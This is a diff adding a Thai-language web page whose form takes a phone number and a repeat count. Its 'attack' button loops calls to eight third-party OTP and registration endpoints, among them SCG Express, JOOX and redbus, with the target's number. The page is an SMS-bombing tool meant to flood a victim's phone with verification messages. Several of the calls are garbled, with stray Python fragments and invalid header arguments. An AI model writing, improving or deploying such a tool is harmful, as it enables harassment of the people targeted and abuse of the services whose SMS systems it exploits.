@@ -1,0 +1,274 @@
+<html lang="en">
+ <head> 
+  <meta charset="utf-8"> 
+  <title>EH4404</title> 
+  <link rel="stylesheet" href="style.css"> 
+  <link rel="shortcut icon" href="https://media.giphy.com/media/0Bu023bUtl6R0dE0pL/giphy.gif" type="image/x-icon"> 
+  <style>
+* {
+  margin: 0;
+  padding: 0;
+  font-family: 'Antic Slab', serif;
+}
+
+body {
+  background-image: url('https://media.giphy.com/media/0Bu023bUtl6R0dE0pL/giphy.gif');
+  background-size: cover;
+  height: 100vh;
+  width: 100%;
+  display:auto;
+  justify-content: center;
+  align-items: center;
+  color:white;
+}
+
+form.conten {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+h5 {
+  font-size: 20px;
+}
+
+.texttop{
+  color: aliceblue;
+  margin: 10px;
+}
+
+input , button{
+  border: none;
+  height: 50px;
+  width: 250px;
+  margin: 10px 0;
+  padding: 0 10px;
+  font-size: 1rem;
+  outline: none;
+  text-align: center;
+  border: 5px;
+  transition: .5s;
+  cursor: pointer;
+}
+
+input {
+  color: black;
+  background: rgba(160, 31, 31, 0.2);
+  border: 1px solid rgba(255, 255, 255, 0.4);
+  border-radius: 10px;
+}
+
+input::placeholder {
+  color:rgb(255, 253, 253)
+}
+
+input:hover,
+input:focus {
+  background: rgb(184, 227, 238);
+  width: 320px;
+  height: 65px;
+  color: black;
+  border: 1px solid;
+  border-radius: 20px;
+  text-shadow: 0 0 20px rgba(27, 25, 25, 0.219);
+}
+
+button {
+  color: rgb(194, 214, 214);
+  background-color: rgba(47, 36, 95, 0.671);
+  border-radius: 20px;
+}
+
+button:hover,
+button:focus {
+  background-color: rgb(194, 214, 214);
+  color: rgba(47, 36, 95, 0.671);
+  border-radius: 10px;
+}
+
+.card1 {
+  backdrop-filter: blur(10px);
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+  margin-top: 50px;
+  position: relative;
+  margin-bottom: 100px;
+  height: 600px;
+  width: 400px;
+  border-radius: 0 0 20px rgba(0,0,0,0.5);
+  padding: 40px;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  border-radius: 10px;
+  text-shadow:0 0 7px #fff,0 0 10px #fff,0 0 21px #fff,0 0 42px #0fa,0 0 82px #0fa,0 0 92px #0fa,0 0 102px #0fa,0 0 151px #0fa;
+  font-size: 6.2rem;
+  animation: pulsate 1.5s infinite a;  
+  border: 0.2rem solid #fff;
+  border-radius: 2rem;
+  padding: 0.4em;
+  box-shadow: 0 0 .2rem #fff,
+            0 0 .2rem #fff,
+            0 0 2rem #bc13fe,
+            0 0 0.8rem #bc13fe,
+            0 0 2.8rem #bc13fe,
+            inset 0 0 1.3rem #bc13fe; 
+}
+
+
+}
+
+.foot {
+  position: auto;
+  padding-top: 30px;
+  margin-top: 20%;
+  left: 0;
+  bottom: 0;
+  width: 100%;
+  height: 80px;
+  background-color: rgba(35, 6, 36, 0.664);
+  color: white;
+  text-align: center;
+}
+
+.chacktext {
+  color:white;
+}
+
+body {
+  margin: 0;
+  font-family: Helvetica, sans-serif;
+  background-color: #f4f4f4;
+}
+
+a {
+  color: #000;
+}
+
+
+</style>
+ </head> 
+ <body> 
+  <center> 
+   <form action="" class="card1"> 
+    <img src="https://media.giphy.com/media/0Bu023bUtl6R0dE0pL/giphy.gif" alt=""> 
+    <input type="text" placeholder="เบอร์" id="phone"> 
+    <input type="number" placeholder="จำนวน" id="number"> 
+    <button type="button" onclick="if (!window.__cfRLUnblockHandlers) return false; sms();">โจมตี</button> 
+   </form> 
+  </center> 
+  <script type="text/javascript">
+        function sms() {
+            var phone = document.getElementById("phone").value;
+            var number = document.getElementById("number").value;
+            alert('เริ่มยิงไปที่ : ' + phone + ' จำนวน : ' + number);
+            for (let i = 0; i < number; i++) {
+                //ไว้ใส่ API เพิ่ม
+             sms1(phone);
+             sms2(phone);
+             sms3(phone);
+             sms4(phone);
+             sms5(phone);
+             sms6(phone);
+             sms7(phone);
+             sms8(phone);
+            }
+            
+
+           // for (let i = 0; i <number; i++) {
+        /* axios.get(`https://www.scgexpress.co.th/member/getRegister?phone=` + phone)
+                .then(function (response) {
+                    console.log(response);
+                })
+                .catch(function (error) {
+                    console.log(error)
+                });
+            sms1(); */
+        }
+         function sms1(phone) {
+
+                axios.get(`https://www.scgexpress.co.th/member/getRegister?phone=` + phone)
+                    .then(function (response) {
+                        console.log(response);
+                    })
+                    .catch(function (error) {
+                        console.log(error)
+                    });
+                console.log("200")
+            }
+  function sms2(phone){
+  axios.get('https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=%7B'+phone+'%7D&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2%22)')
+  .then(function (response){
+      console.log(response);
+  })
+  .catch(function (error){
+      console.log(error);
+  });
+
+  }
+  function sms3(phone){
+      //requests.get(f"https://www.scgexpress.co.th/member/getRegister?phone=%7Bphone%7D%22)
+
+      axios.get('https://www.scgexpress.co.th/member/getRegister?phone=%7B'+phone+'%7D%22')
+      .then(function (response){
+          console.log(response);
+      })
+      .catch(function (error){
+          console.log(error);
+      })
+  }
+
+  function sms4(phone){
+      //requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo=%7Bphone%7D&type=Register%22)
+      axios.get('https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo=%7B'+phone+'%7D&type=Register%22')
+      .then(function (response){
+          console.log(response);
+      })
+      .catch(function (error) {
+          console.log(error);
+      })
+  } 
+  function sms5(phone){
+      axios.get('https://laopun.com/send-sms?id=%7B'+phone+'%7D&otp=5153%22',headers = head)
+      .then(function (response){
+          console.log(response);
+      })
+      .catch(function (error){
+          console.log(error);
+      })
+ //requests.get(f"https://laopun.com/send-sms?id=%7Bphone%7D&otp=5153%22,headers=head)
+  }
+  function sms6(phone){
+      axios.get('https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&'+phone+'=%22+phone+%22&img_code=', headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
+//requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone=%22+phone+%22&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
+  .then(function (response) {
+      console.log(response);
+  })
+  .catch(function (error) {
+      console.log(error);
+  })
+}
+  function sms7(phone) {
+      //requests.get('http://m.thaiuang.com/uc/authcode/sms/get/reg/%27+phone)
+      axios.get('http://m.thaiuang.com/uc/authcode/sms/get/reg/%27+'+phone)
+      .then(function (response){
+          console.log(response);
+      })
+      .catch(function (error) {
+          console.log(error);
+      });
+  }
+  function sms8(phone){
+      axios.get('https://m.redbus.id/api/getOtp?number=%22+phone[1:]+%22&cc=66&whatsAppOpted=true%22',headers="%7B%22traceparent","00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent","Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36").text
+      .then(function (response){
+          console.log(response);
+      })
+      .catch(function (error){
+          console.log(error);
+      })
+//requests.get("https://m.redbus.id/api/getOtp?number=%22+phone[1:]+%22&cc=66&whatsAppOpted=true%22,headers=%7B%22traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
+}
+
+    </script> 
+ </body>
+</html>
